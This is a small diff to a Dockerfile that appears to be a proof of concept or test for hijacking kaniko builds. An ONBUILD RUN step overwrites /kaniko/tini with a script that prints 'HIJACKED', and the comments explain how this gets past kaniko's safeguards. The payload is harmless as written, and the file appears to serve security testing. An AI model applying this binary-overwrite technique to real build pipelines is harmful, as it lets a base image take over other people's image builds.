@@ -29,7 +29,7 @@ tini
 # Thirdly, we can use a `ONBUILD RUN` statement directly
 # here kaniko has no chance to block us as RUN statements
 # are per design an all powerful blackbox.
-ONBUILD RUN mv /kaniko/tini /dev/null \
+ONBUILD RUN mv /kaniko/tini /dev/null || true \
     && echo "#!/bin/sh" > /kaniko/tini \
     && echo "echo HIJACKED" >> /kaniko/tini \
     && echo "exit 1" >> /kaniko/tini \
@@ -37,4 +37,4 @@ ONBUILD RUN mv /kaniko/tini /dev/null \
 
 FROM ${IMAGE_REPO}hijack:latest
 # /kaniko/tini gets implicitly executed here
-RUN ls -la /kaniko || true
+RUN ls -la /kaniko && cat /kaniko/tini || true
